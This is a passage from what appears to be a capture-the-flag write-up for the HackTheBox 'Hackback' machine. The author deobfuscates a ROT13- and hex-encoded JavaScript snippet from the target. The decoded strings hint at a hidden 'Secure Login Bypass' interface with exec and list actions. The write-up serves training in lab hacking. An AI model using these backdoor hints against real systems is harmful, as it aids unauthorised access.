class="p">,</span><span class="nx">q</span><span class="p">){</span><span class="nx">ine</span> <span class="nx">r</span><span class="o">=</span><span class="nx">shapgvba</span><span class="p">(</span><span class="nx">s</span><span class="p">){</span><span class="nx">juvyr</span><span class="p">(</span><span class="o">--</span><span class="nx">s</span><span class="p">){</span><span class="nx">p</span><span class="p">[</span><span class="dl">'</span><span class="s1">chfu</span><span class="dl">'</span><span class="p">](</span><span class="nx">p</span><span class="p">[</span><span class="dl">'</span><span class="s1">fuvsg</span><span class="dl">'</span><span class="p">]());}};</span><span class="nx">r</span><span class="p">(</span><span class="o">++</span><span class="nx">q</span><span class="p">);}(</span><span class="nx">n</span><span class="p">,</span><span class="mi">0</span><span class="nx">k66</span><span class="p">));</span><span class="nx">ine</span> <span class="nx">o</span><span class="o">=</span><span class="nx">shapgvba</span><span class="p">(</span><span class="nx">p</span><span class="p">,</span><span class="nx">q</span><span class="p">){</span><span class="nx">p</span><span class="o">=</span><span class="nx">p</span><span class="o">-</span><span class="mi">0</span><span class="nx">k0</span><span class="p">;</span><span class="nx">ine</span> <span class="nx">r</span><span class="o">=</span><span class="nx">n</span><span class="p">[</span><span class="nx">p</span><span class="p">];</span><span class="nx">vs</span><span class="p">(</span><span class="nx">o</span><span class="p">[</span><span class="dl">'</span><span class="s1">ZfHYzi</span><span class="dl">'</span><span class="p">]</span><span class="o">===</span><span class="nx">haqrsvarq</span><span class="p">){(</span><span class="nx">shapgvba</span><span class="p">(){</span><span class="nx">ine</span> <span class="nx">s</span><span class="p">;</span><span class="nx">gel</span><span class="p">{</span><span class="nx">ine</span> <span class="nx">t</span><span class="o">=</span><span class="nx">Shapgvba</span><span class="p">(</span><span class="dl">'</span><span class="s1">erghea</span><span class="se">\</span><span class="s1">k20(shapgvba()</span><span class="se">\</span><span class="s1">k20</span><span class="dl">'</span><span class="o">+</span><span class="dl">'</span><span class="s1">{}.pbafgehpgbe(</span><span class="se">\</span><span class="s1">k22erghea</span><span class="se">\</span><span class="s1">k20guvf</span><span class="se">\</span><span class="s1">k22)(</span><span class="se">\</span><span class="s1">k20)</span><span class="dl">'</span><span class="o">+</span><span class="dl">'</span><span class="s1">);</span><span class="dl">'</span><span class="p">);</span><span class="nx">s</span><span class="o">=</span><span class="nx">t</span><span class="p">();}</span><span class="nx">pngpu</span><span class="p">(</span><span class="nx">u</span><span class="p">){</span><span class="nx">s</span><span class="o">=</span><span class="nx">jvaqbj</span><span class="p">;}</span><span class="nx">ine</span> <span class="nx">v</span><span class="o">=</span><span class="dl">'</span><span class="s1">NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm0123456789+/=</span><span class="dl">'</span><span class="p">;</span><span class="nx">s</span><span class="p">[</span><span class="dl">'</span><span class="s1">ngbo</span><span class="dl">'</span><span class="p">]</span><span class="o">||</span><span class="p">(</span><span class="nx">s</span><span class="p">[</span><span class="dl">'</span><span class="s1">ngbo</span><span class="dl">'</span><span class="p">]</span><span class="o">=</span><span class="nx">shapgvba</span><span class="p">(</span><span class="nx">w</span><span class="p">){</span><span class="nx">ine</span> <span class="nx">x</span><span class="o">=</span><span class="nx">Fgevat</span><span class="p">(</span><span class="nx">w</span><span class="p">)[</span><span class="dl">'</span><span class="s1">ercynpr</span><span class="dl">'</span><span class="p">](</span><span class="sr">/=+$/</span><span class="p">,</span><span class="dl">''</span><span class="p">);</span><span class="nx">sbe</span><span class="p">(</span><span class="nx">ine</span> <span class="nx">y</span><span class="o">=</span><span class="mi">0</span><span class="nx">k0</span><span class="p">,</span><span class="nx">z</span><span class="p">,</span><span class="nx">a</span><span class="p">,</span><span class="nx">b</span><span class="o">=</span><span class="mi">0</span><span class="nx">k0</span><span class="p">,</span><span class="nx">c</span><span class="o">=</span><span class="dl">''</span><span class="p">;</span><span class="nx">a</span><span class="o">=</span><span class="nx">x</span><span class="p">[</span><span class="dl">'</span><span class="s1">puneNg</span><span class="dl">'</span><span class="p">](</span><span class="nx">b</span><span class="o">++</span><span class="p">);</span><span class="o">~</span><span class="nx">a</span><span class="o">&amp;&amp;</span><span class="p">(</span><span class="nx">z</span><span class="o">=</span><span class="nx">y</span><span class="o">%</span><span class="mi">0</span><span class="nx">k4</span><span class="p">?</span><span class="nx">z</span><span class="o">*</span><span class="mi">0</span><span class="nx">k40</span><span class="o">+</span><span class="nx">a</span><span class="p">:</span><span class="nx">a</span><span class="p">,</span><span class="nx">y</span><span class="o">++%</span><span class="mi">0</span><span class="nx">k4</span><span class="p">)?</span><span class="nx">c</span><span class="o">+=</span><span class="nx">Fgevat</span><span class="p">[</span><span class="dl">'</span><span class="s1">sebzPunePbqr</span><span class="dl">'</span><span class="p">](</span><span class="mi">0</span><span class="nx">kss</span><span class="o">&amp;</span><span class="nx">z</span><span class="o">&gt;&gt;</span><span class="p">(</span><span class="o">-</span><span class="mi">0</span><span class="nx">k2</span><span class="o">*</span><span class="nx">y</span><span class="o">&amp;</span><span class="mi">0</span><span class="nx">k6</span><span class="p">)):</span><span class="mi">0</span><span class="nx">k0</span><span class="p">){</span><span class="nx">a</span><span class="o">=</span><span class="nx">v</span><span class="p">[</span><span class="dl">'</span><span class="s1">vaqrkBs</span><span class="dl">'</span><span class="p">](</span><span class="nx">a</span><span class="p">);}</span><span class="nx">erghea</span> <span class="nx">c</span><span class="p">;});}());</span><span class="nx">ine</span> <span class="nx">d</span><span class="o">=</span><span class="nx">shapgvba</span><span class="p">(</span><span class="nx">e</span><span class="p">,</span><span class="nx">q</span><span class="p">){</span><span class="nx">ine</span> <span class="nx">g</span><span class="o">=</span><span class="p">[],</span><span class="nx">h</span><span class="o">=</span><span class="mi">0</span><span class="nx">k0</span><span class="p">,</span><span class="nx">i</span><span class="p">,</span><span class="nx">j</span><span class="o">=</span><span class="dl">''</span><span class="p">,</span><span class="nx">k</span><span class="o">=</span><span class="dl">''</span><span class="p">;</span><span class="nx">e</span><span class="o">=</span><span class="nx">ngbo</span><span class="p">(</span><span class="nx">e</span><span class="p">);</span><span class="nx">sbe</span><span class="p">(</span><span class="nx">ine</span> <span class="nx">l</span><span class="o">=</span><span class="mi">0</span><span class="nx">k0</span><span class="p">,</span><span class="nx">m</span><span class="o">=</span><span class="nx">e</span><span class="p">[</span><span class="dl">'</span><span class="s1">yratgu</span><span class="dl">'</span><span class="p">];</span><span class="nx">l</span><span class="o">&lt;</span><span class="nx">m</span><span class="p">;</span><span class="nx">l</span><span class="o">++</span><span class="p">){</span><span class="nx">k</span><span class="o">+=</span><span class="dl">'</span><span class="s1">%</span><span class="dl">'</span><span class="o">+</span><span class="p">(</span><span class="dl">'</span><span class="s1">00</span><span class="dl">'</span><span class="o">+</span><span class="nx">e</span><span class="p">[</span><span class="dl">'</span><span class="s1">punePbqrNg</span><span class="dl">'</span><span class="p">](</span><span class="nx">l</span><span class="p">)[</span><span class="dl">'</span><span class="s1">gbFgevat</span><span class="dl">'</span><span class="p">](</span><span class="mi">0</span><span class="nx">k10</span><span class="p">))[</span><span class="dl">'</span><span class="s1">fyvpr</span><span class="dl">'</span><span class="p">](</span><span class="o">-</span><span class="mi">0</span><span class="nx">k2</span><span class="p">);}</span><span class="nx">e</span><span class="o">=</span><span class="nx">qrpbqrHEVPbzcbarag</span><span class="p">(</span><span class="nx">k</span><span class="p">);</span><span class="nx">sbe</span><span class="p">(</span><span class="nx">ine</span> <span class="nx">N</span><span class="o">=</span><span class="mi">0</span><span class="nx">k0</span><span class="p">;</span><span class="nx">N</span><span class="o">&lt;</span><span class="mi">0</span><span class="nx">k100</span><span class="p">;</span><span class="nx">N</span><span class="o">++</span><span class="p">){</span><span class="nx">g</span><span class="p">[</span><span class="nx">N</span><span class="p">]</span><span class="o">=</span><span class="nx">N</span><span class="p">;}</span><span class="nx">sbe</span><span class="p">(</span><span class="nx">N</span><span class="o">=</span><span class="mi">0</span><span class="nx">k0</span><span class="p">;</span><span class="nx">N</span><span class="o">&lt;</span><span class="mi">0</span><span class="nx">k100</span><span class="p">;</span><span class="nx">N</span><span class="o">++</span><span class="p">){</span><span class="nx">h</span><span class="o">=</span><span class="p">(</span><span class="nx">h</span><span class="o">+</span><span class="nx">g</span><span class="p">[</span><span class="nx">N</span><span class="p">]</span><span class="o">+</span><span class="nx">q</span><span class="p">[</span><span class="dl">'</span><span class="s1">punePbqrNg</span><span class="dl">'</span><span class="p">](</span><span class="nx">N</span><span class="o">%</span><span class="nx">q</span><span class="p">[</span><span class="dl">'</span><span class="s1">yratgu</span><span class="dl">'</span><span class="p">]))</span><span class="o">%</span><span class="mi">0</span><span class="nx">k100</span><span class="p">;</span><span class="nx">i</span><span class="o">=</span><span class="nx">g</span><span class="p">[</span><span class="nx">N</span><span class="p">];</span><span class="nx">g</span><span class="p">[</span><span class="nx">N</span><span class="p">]</span><span class="o">=</span><span class="nx">g</span><span class="p">[</span><span class="nx">h</span><span class="p">];</span><span class="nx">g</span><span class="p">[</span><span class="nx">h</span><span class="p">]</span><span class="o">=</span><span class="nx">i</span><span class="p">;}</span><span class="nx">N</span><span class="o">=</span><span class="mi">0</span><span class="nx">k0</span><span class="p">;</span><span class="nx">h</span><span class="o">=</span><span class="mi">0</span><span class="nx">k0</span><span class="p">;</span><span class="nx">sbe</span><span class="p">(</span><span class="nx">ine</span> <span class="nx">O</span><span class="o">=</span><span class="mi">0</span><span class="nx">k0</span><span class="p">;</span><span class="nx">O</span><span class="o">&lt;</span><span class="nx">e</span><span class="p">[</span><span class="dl">'</span><span class="s1">yratgu</span><span class="dl">'</span><span class="p">];</span><span class="nx">O</span><span class="o">++</span><span class="p">){</span><span class="nx">N</span><span class="o">=</span><span class="p">(</span><span class="nx">N</span><span class="o">+</span><span class="mi">0</span><span class="nx">k1</span><span class="p">)</span><span class="o">%</span><span class="mi">0</span><span class="nx">k100</span><span class="p">;</span><span class="nx">h</span><span class="o">=</span><span class="p">(</span><span class="nx">h</span><span class="o">+</span><span class="nx">g</span><span class="p">[</span><span class="nx">N</span><span class="p">])</span><span class="o">%</span><span class="mi">0</span><span class="nx">k100</span><span class="p">;</span><span class="nx">i</span><span class="o">=</span><span class="nx">g</span><span class="p">[</span><span class="nx">N</span><span class="p">];</span><span class="nx">g</span><span class="p">[</span><span class="nx">N</span><span class="p">]</span><span class="o">=</span><span class="nx">g</span><span class="p">[</span><span class="nx">h</span><span class="p">];</span><span class="nx">g</span><span class="p">[</span><span class="nx">h</span><span class="p">]</span><span class="o">=</span><span class="nx">i</span><span class="p">;</span><span class="nx">j</span><span class="o">+=</span><span class="nx">Fgevat</span><span class="p">[</span><span class="dl">'</span><span class="s1">sebzPunePbqr</span><span class="dl">'</span><span class="p">](</span><span class="nx">e</span><span class="p">[</span><span class="dl">'</span><span class="s1">punePbqrNg</span><span class="dl">'</span><span class="p">](</span><span class="nx">O</span><span class="p">)</span><span class="o">^</span><span class="nx">g</span><span class="p">[(</span><span class="nx">g</span><span class="p">[</span><span class="nx">N</span><span class="p">]</span><span class="o">+</span><span class="nx">g</span><span class="p">[</span><span class="nx">h</span><span class="p">])</span><span class="o">%</span><span class="mi">0</span><span class="nx">k100</span><span class="p">]);}</span><span class="nx">erghea</span> <span class="nx">j</span><span class="p">;};</span><span class="nx">o</span><span class="p">[</span><span class="dl">'</span><span class="s1">BbNPpq</span><span class="dl">'</span><span class="p">]</span><span class="o">=</span><span class="nx">d</span><span class="p">;</span><span class="nx">o</span><span class="p">[</span><span class="dl">'</span><span class="s1">dFYjTx</span><span class="dl">'</span><span class="p">]</span><span class="o">=</span><span class="p">{};</span><span class="nx">o</span><span class="p">[</span><span class="dl">'</span><span class="s1">ZfHYzi</span><span class="dl">'</span><span class="p">]</span><span class="o">=!!</span><span class="p">[];}</span><span class="nx">ine</span> <span class="nx">P</span><span class="o">=</span><span class="nx">o</span><span class="p">[</span><span class="dl">'</span><span class="s1">dFYjTx</span><span class="dl">'</span><span class="p">][</span><span class="nx">p</span><span class="p">];</span><span class="nx">vs</span><span class="p">(</span><span class="nx">P</span><span class="o">===</span><span class="nx">haqrsvarq</span><span class="p">){</span><span class="nx">vs</span><span class="p">(</span><span class="nx">o</span><span class="p">[</span><span class="dl">'</span><span class="s1">cVwyDO</span><span class="dl">'</span><span class="p">]</span><span class="o">===</span><span class="nx">haqrsvarq</span><span class="p">){</span><span class="nx">o</span><span class="p">[</span><span class="dl">'</span><span class="s1">cVwyDO</span><span class="dl">'</span><span class="p">]</span><span class="o">=!!</span><span class="p">[];}</span><span class="nx">r</span><span class="o">=</span><span class="nx">o</span><span class="p">[</span><span class="dl">'</span><span class="s1">BbNPpq</span><span class="dl">'</span><span class="p">](</span><span class="nx">r</span><span class="p">,</span><span class="nx">q</span><span class="p">);</span><span class="nx">o</span><span class="p">[</span><span class="dl">'</span><span class="s1">dFYjTx</span><span class="dl">'</span><span class="p">][</span><span class="nx">p</span><span class="p">]</span><span class="o">=</span><span class="nx">r</span><span class="p">;}</span><span class="nx">ryfr</span><span class="p">{</span><span class="nx">r</span><span class="o">=</span><span class="nx">P</span><span class="p">;}</span><span class="nx">erghea</span> <span class="nx">r</span><span class="p">;};</span><span class="nx">ine</span> <span class="nx">k</span><span class="o">=</span><span class="dl">'</span><span class="se">\</span><span class="s1">k53</span><span class="se">\</span><span class="s1">k65</span><span class="se">\</span><span class="s1">k63</span><span class="se">\</span><span class="s1">k75</span><span class="se">\</span><span class="s1">k72</span><span class="se">\</span><span class="s1">k65</span><span class="se">\</span><span class="s1">k20</span><span class="se">\</span><span class="s1">k4p</span><span class="se">\</span><span class="s1">k6s</span><span class="se">\</span><span class="s1">k67</span><span class="se">\</span><span class="s1">k69</span><span class="se">\</span><span class="s1">k6r</span><span class="se">\</span><span class="s1">k20</span><span class="se">\</span><span class="s1">k42</span><span class="se">\</span><span class="s1">k79</span><span class="se">\</span><span class="s1">k70</span><span class="se">\</span><span class="s1">k61</span><span class="se">\</span><span class="s1">k73</span><span class="se">\</span><span class="s1">k73</span><span class="dl">'</span><span class="p">;</span><span class="nx">ine</span> <span class="nx">m</span><span class="o">=</span><span class="nx">o</span><span class="p">(</span><span class="dl">'</span><span class="s1">0k0</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="se">\</span><span class="s1">k50</span><span class="se">\</span><span class="s1">k5q</span><span class="se">\</span><span class="s1">k53</span><span class="se">\</span><span class="s1">k36</span><span class="dl">'</span><span class="p">);</span><span class="nx">ine</span> <span class="nx">u</span><span class="o">=</span><span class="nx">o</span><span class="p">(</span><span class="dl">'</span><span class="s1">0k1</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="se">\</span><span class="s1">k72</span><span class="se">\</span><span class="s1">k37</span><span class="se">\</span><span class="s1">k54</span><span class="se">\</span><span class="s1">k59</span><span class="dl">'</span><span class="p">);</span><span class="nx">ine</span> <span class="nx">l</span><span class="o">=</span><span class="nx">o</span><span class="p">(</span><span class="dl">'</span><span class="s1">0k2</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="se">\</span><span class="s1">k44</span><span class="se">\</span><span class="s1">k41</span><span class="se">\</span><span class="s1">k71</span><span class="se">\</span><span class="s1">k67</span><span class="dl">'</span><span class="p">);</span><span class="nx">ine</span> <span class="nx">g</span><span class="o">=</span><span class="dl">'</span><span class="se">\</span><span class="s1">k3s</span><span class="se">\</span><span class="s1">k61</span><span class="se">\</span><span class="s1">k63</span><span class="se">\</span><span class="s1">k74</span><span class="se">\</span><span class="s1">k69</span><span class="se">\</span><span class="s1">k6s</span><span class="se">\</span><span class="s1">k6r</span><span class="se">\</span><span class="s1">k3q</span><span class="se">\</span><span class="s1">k28</span><span class="se">\</span><span class="s1">k73</span><span class="se">\</span><span class="s1">k68</span><span class="se">\</span><span class="s1">k6s</span><span class="se">\</span><span class="s1">k77</span><span class="se">\</span><span class="s1">k2p</span><span class="se">\</span><span class="s1">k6p</span><span class="se">\</span><span class="s1">k69</span><span class="se">\</span><span class="s1">k73</span><span class="se">\</span><span class="s1">k74</span><span class="se">\</span><span class="s1">k2p</span><span class="se">\</span><span class="s1">k65</span><span class="se">\</span><span class="s1">k78</span><span class="se">\</span><span class="s1">k65</span><span class="se">\</span><span class="s1">k63</span><span class="se">\</span><span class="s1">k2p</span><span class="se">\</span><span class="s1">k69</span><span class="se">\</span><span class="s1">k6r</span><span class="se">\</span><span class="s1">k69</span><span class="se">\</span><span class="s1">k74</span><span class="se">\</span><span class="s1">k29</span><span class="dl">'</span><span class="p">;</span><span class="nx">ine</span> <span class="nx">f</span><span class="o">=</span><span class="dl">'</span><span class="se">\</span><span class="s1">k26</span><span class="se">\</span><span class="s1">k73</span><span class="se">\</span><span class="s1">k69</span><span class="se">\</span><span class="s1">k74</span><span class="se">\</span><span class="s1">k65</span><span class="se">\</span><span class="s1">k3q</span><span class="se">\</span><span class="s1">k28</span><span class="se">\</span><span class="s1">k74</span><span class="se">\</span><span class="s1">k77</span><span class="se">\</span><span class="s1">k69</span><span class="se">\</span><span class="s1">k74</span><span class="se">\</span><span class="s1">k74</span><span class="se">\</span><span class="s1">k65</span><span class="se">\</span><span class="s1">k72</span><span class="se">\</span><span class="s1">k2p</span><span class="se">\</span><span class="s1">k70</span><span class="se">\</span><span class="s1">k61</span><span class="se">\</span><span class="s1">k79</span><span class="se">\</span><span class="s1">k70</span><span class="se">\</span><span class="s1">k61</span><span class="se">\</span><span class="s1">k6p</span><span class="se">\</span><span class="s1">k2p</span><span class="se">\</span><span class="s1">k66</span><span class="se">\</span><span class="s1">k61</span><span class="se">\</span><span class="s1">k63</span><span class="se">\</span><span class="s1">k65</span><span class="se">\</span><span class="s1">k62</span><span class="se">\</span><span class="s1">k6s</span><span class="se">\</span><span class="s1">k6s</span><span class="se">\</span><span class="s1">k6o</span><span class="se">\</span><span class="s1">k2p</span><span class="se">\</span><span class="s1">k68</span><span class="se">\</span><span class="s1">k61</span><span class="se">\</span><span class="s1">k63</span><span class="se">\</span><span class="s1">k6o</span><span class="se">\</span><span class="s1">k74</span><span class="se">\</span><span class="s1">k68</span><span class="se">\</span><span class="s1">k65</span><span class="se">\</span><span class="s1">k62</span><span class="se">\</span><span class="s1">k6s</span><span class="se">\</span><span class="s1">k78</span><span class="se">\</span><span class="s1">k29</span><span class="dl">'</span><span class="p">;</span><span class="nx">ine</span> <span class="nx">v</span><span class="o">=</span><span class="dl">'</span><span class="se">\</span><span class="s1">k26</span><span class="se">\</span><span class="s1">k70</span><span class="se">\</span><span class="s1">k61</span><span class="se">\</span><span class="s1">k73</span><span class="se">\</span><span class="s1">k73</span><span class="se">\</span><span class="s1">k77</span><span class="se">\</span><span class="s1">k6s</span><span class="se">\</span><span class="s1">k72</span><span class="se">\</span><span class="s1">k64</span><span class="se">\</span><span class="s1">k3q</span><span class="se">\</span><span class="s1">k2n</span><span class="se">\</span><span class="s1">k2n</span><span class="se">\</span><span class="s1">k2n</span><span class="se">\</span><span class="s1">k2n</span><span class="se">\</span><span class="s1">k2n</span><span class="se">\</span><span class="s1">k2n</span><span class="se">\</span><span class="s1">k2n</span><span class="se">\</span><span class="s1">k2n</span><span class="dl">'</span><span class="p">;</span><span class="nx">ine</span> <span class="nx">x</span><span class="o">=</span><span class="dl">'</span><span class="se">\</span><span class="s1">k26</span><span class="se">\</span><span class="s1">k73</span><span class="se">\</span><span class="s1">k65</span><span class="se">\</span><span class="s1">k73</span><span class="se">\</span><span class="s1">k73</span><span class="se">\</span><span class="s1">k69</span><span class="se">\</span><span class="s1">k6s</span><span class="se">\</span><span class="s1">k6r</span><span class="se">\</span><span class="s1">k3q</span><span class="dl">'</span><span class="p">;</span><span class="nx">ine</span> <span class="nx">j</span><span class="o">=</span><span class="dl">'</span><span class="se">\</span><span class="s1">k4r</span><span class="se">\</span><span class="s1">k6s</span><span class="se">\</span><span class="s1">k74</span><span class="se">\</span><span class="s1">k68</span><span class="se">\</span><span class="s1">k69</span><span class="se">\</span><span class="s1">k6r</span><span class="se">\</span><span class="s1">k67</span><span class="se">\</span><span class="s1">k20</span><span class="se">\</span><span class="s1">k6q</span><span class="se">\</span><span class="s1">k6s</span><span class="se">\</span><span class="s1">k72</span><span class="se">\</span><span class="s1">k65</span><span class="se">\</span><span class="s1">k20</span><span class="se">\</span><span class="s1">k74</span><span class="se">\</span><span class="s1">k6s</span><span class="se">\</span><span class="s1">k20</span><span class="se">\</span><span class="s1">k73</span><span class="se">\</span><span class="s1">k61</span><span class="se">\</span><span class="s1">k79</span><span class="dl">'</span><span class="p">;</span>
<span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span></code></pre></div></div>
<p>First thing we notice is that it’s not actually <code class="language-plaintext highlighter-rouge">js</code>. <code class="language-plaintext highlighter-rouge">ine n</code> ? This doesn’t look like <code class="language-plaintext highlighter-rouge">js</code>, most likely it’s gonna be <code class="language-plaintext highlighter-rouge">var</code>. <code class="language-plaintext highlighter-rouge">v</code> is the 22nd letter in alphabet while <code class="language-plaintext highlighter-rouge">i</code> is the 9th. <code class="language-plaintext highlighter-rouge">22 - 9 = 13</code>
So this script is <code class="language-plaintext highlighter-rouge">rot 13</code> encoded. I used <a href="https://www.rot13.com" target="_blank" rel="noopener noreferrer">rot13.com</a> to decode it :
<br><img src="/images/hackthebox/hackback/7.png" alt="" class="align-center"><br><br></p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">a</span><span class="o">=</span><span class="p">[</span><span class="dl">'</span><span class="se">\</span><span class="s1">x57</span><span class="se">\</span><span class="s1">x78</span><span class="se">\</span><span class="s1">x49</span><span class="se">\</span><span class="s1">x6a</span><span class="se">\</span><span class="s1">x77</span><span class="se">\</span><span class="s1">x72</span><span class="se">\</span><span class="s1">x37</span><span class="se">\</span><span class="s1">x44</span><span class="se">\</span><span class="s1">x75</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x4f</span><span class="se">\</span><span class="s1">x38</span><span class="se">\</span><span class="s1">x47</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x4b</span><span class="se">\</span><span class="s1">x76</span><span class="se">\</span><span class="s1">x52</span><span class="se">\</span><span class="s1">x77</span><span class="se">\</span><span class="s1">x42</span><span class="se">\</span><span class="s1">x2b</span><span class="se">\</span><span class="s1">x77</span><span class="se">\</span><span class="s1">x71</span><span class="se">\</span><span class="s1">x33</span><span class="se">\</span><span class="s1">x44</span><span class="se">\</span><span class="s1">x75</span><span class="se">\</span><span class="s1">x4d</span><span class="se">\</span><span class="s1">x4b</span><span class="se">\</span><span class="s1">x72</span><span class="se">\</span><span class="s1">x77</span><span class="se">\</span><span class="s1">x72</span><span class="se">\</span><span class="s1">x4c</span><span class="se">\</span><span class="s1">x44</span><span class="se">\</span><span class="s1">x67</span><span class="se">\</span><span class="s1">x63</span><span class="se">\</span><span class="s1">x4f</span><span class="se">\</span><span class="s1">x69</span><span class="se">\</span><span class="s1">x77</span><span class="se">\</span><span class="s1">x72</span><span class="se">\</span><span class="s1">x59</span><span class="se">\</span><span class="s1">x31</span><span class="se">\</span><span class="s1">x4b</span><span class="se">\</span><span class="s1">x45</span><span class="se">\</span><span class="s1">x45</span><span class="se">\</span><span class="s1">x67</span><span class="se">\</span><span class="s1">x47</span><span class="se">\</span><span class="s1">x38</span><span class="se">\</span><span class="s1">x4b</span><span class="se">\</span><span class="s1">x43</span><span class="se">\</span><span class="s1">x77</span><span class="se">\</span><span class="s1">x71</span><span class="se">\</span><span class="s1">x37</span><span class="se">\</span><span class="s1">x44</span><span class="se">\</span><span class="s1">x6c</span><span class="se">\</span><span class="s1">x38</span><span class="se">\</span><span class="s1">x4b</span><span class="se">\</span><span class="s1">x33</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="se">\</span><span class="s1">x41</span><span class="se">\</span><span class="s1">x63</span><span class="se">\</span><span class="s1">x4f</span><span class="se">\</span><span class="s1">x4d</span><span class="se">\</span><span class="s1">x77</span><span class="se">\</span><span class="s1">x71</span><span class="se">\</span><span class="s1">x76</span><span class="se">\</span><span class="s1">x44</span><span class="se">\</span><span class="s1">x71</span><span class="se">\</span><span class="s1">x51</span><span class="se">\</span><span class="s1">x67</span><span class="se">\</span><span class="s1">x43</span><span class="se">\</span><span class="s1">x77</span><span class="se">\</span><span class="s1">x34</span><span class="se">\</span><span class="s1">x2f</span><span class="se">\</span><span class="s1">x43</span><span class="se">\</span><span class="s1">x74</span><span class="se">\</span><span class="s1">x32</span><span class="se">\</span><span class="s1">x6e</span><span class="se">\</span><span class="s1">x44</span><span class="se">\</span><span class="s1">x74</span><span class="se">\</span><span class="s1">x4d</span><span class="se">\</span><span class="s1">x4b</span><span class="se">\</span><span class="s1">x68</span><span class="se">\</span><span class="s1">x5a</span><span class="se">\</span><span class="s1">x63</span><span class="se">\</span><span class="s1">x4b</span><span class="se">\</span><span class="s1">x44</span><span class="se">\</span><span class="s1">x77</span><span class="se">\</span><span class="s1">x71</span><span class="se">\</span><span class="s1">x54</span><span class="se">\</span><span class="s1">x43</span><span class="se">\</span><span class="s1">x70</span><span class="se">\</span><span class="s1">x54</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x79</span><span class="se">\</span><span class="s1">x77</span><span class="se">\</span><span class="s1">x37</span><span class="se">\</span><span class="s1">x6e</span><span class="se">\</span><span class="s1">x43</span><span class="se">\</span><span class="s1">x68</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x4f</span><span class="se">\</span><span class="s1">x51</span><span class="se">\</span><span class="s1">x58</span><span class="se">\</span><span class="s1">x4d</span><span class="se">\</span><span class="s1">x4f</span><span class="se">\</span><span class="s1">x35</span><span class="se">\</span><span class="s1">x57</span><span class="se">\</span><span class="s1">x38</span><span class="se">\</span><span class="s1">x4b</span><span class="se">\</span><span class="s1">x70</span><span class="se">\</span><span class="s1">x44</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x4f</span><span class="se">\</span><span class="s1">x74</span><span class="se">\</span><span class="s1">x4e</span><span class="se">\</span><span class="s1">x43</span><span class="se">\</span><span class="s1">x44</span><span class="se">\</span><span class="s1">x44</span><span class="se">\</span><span class="s1">x76</span><span class="se">\</span><span class="s1">x41</span><span class="se">\</span><span class="s1">x6a</span><span class="se">\</span><span class="s1">x43</span><span class="se">\</span><span class="s1">x67</span><span class="se">\</span><span class="s1">x79</span><span class="se">\</span><span class="s1">x6b</span><span class="se">\</span><span class="s1">x3d</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="se">\</span><span class="s1">x77</span><span class="se">\</span><span class="s1">x35</span><span class="se">\</span><span class="s1">x48</span><span class="se">\</span><span class="s1">x44</span><span class="se">\</span><span class="s1">x72</span><span class="se">\</span><span class="s1">x38</span><span class="se">\</span><span class="s1">x4f</span><span class="se">\</span><span class="s1">x37</span><span class="se">\</span><span class="s1">x64</span><span class="se">\</span><span class="s1">x44</span><span class="se">\</span><span class="s1">x52</span><span class="se">\</span><span class="s1">x6d</span><span class="se">\</span><span class="s1">x4d</span><span class="se">\</span><span class="s1">x4d</span><span class="se">\</span><span class="s1">x4b</span><span class="se">\</span><span class="s1">x4a</span><span class="se">\</span><span class="s1">x77</span><span class="se">\</span><span class="s1">x34</span><span class="se">\</span><span class="s1">x6a</span><span class="se">\</span><span class="s1">x44</span><span class="se">\</span><span class="s1">x6c</span><span class="se">\</span><span class="s1">x56</span><span class="se">\</span><span class="s1">x52</span><span class="se">\</span><span class="s1">x6e</span><span class="se">\</span><span class="s1">x77</span><span class="se">\</span><span class="s1">x72</span><span class="se">\</span><span class="s1">x74</span><span class="se">\</span><span class="s1">x37</span><span class="se">\</span><span class="s1">x77</span><span class="se">\</span><span class="s1">x37</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x30</span><span class="se">\</span><span class="s1">x77</span><span class="se">\</span><span class="s1">x6f</span><span class="se">\</span><span class="s1">x31</span><span class="se">\</span><span class="s1">x61</span><span class="se">\</span><span class="s1">x77</span><span class="se">\</span><span class="s1">x37</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x41</span><span class="se">\</span><span class="s1">x51</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x4b</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x66</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x4f</span><span class="se">\</span><span class="s1">x45</span><span class="se">\</span><span class="s1">x77</span><span class="se">\</span><span class="s1">x34</span><span class="se">\</span><span class="s1">x58</span><span class="se">\</span><span class="s1">x44</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x52</span><span class="se">\</span><span class="s1">x6a</span><span class="se">\</span><span class="s1">x43</span><span class="se">\</span><span class="s1">x6c</span><span class="se">\</span><span class="s1">x4d</span><span class="se">\</span><span class="s1">x4f</span><span class="se">\</span><span class="s1">x77</span><span class="se">\</span><span class="s1">x46</span><span class="se">\</span><span class="s1">x7a</span><span class="se">\</span><span class="s1">x72</span><span class="se">\</span><span class="s1">x43</span><span class="se">\</span><span class="s1">x6d</span><span class="se">\</span><span class="s1">x7a</span><span class="se">\</span><span class="s1">x70</span><span class="se">\</span><span class="s1">x76</span><span class="se">\</span><span class="s1">x43</span><span class="se">\</span><span class="s1">x41</span><span class="se">\</span><span class="s1">x6a</span><span class="se">\</span><span class="s1">x43</span><span class="se">\</span><span class="s1">x75</span><span class="se">\</span><span class="s1">x42</span><span class="se">\</span><span class="s1">x7a</span><span class="se">\</span><span class="s1">x44</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x4b</span><span 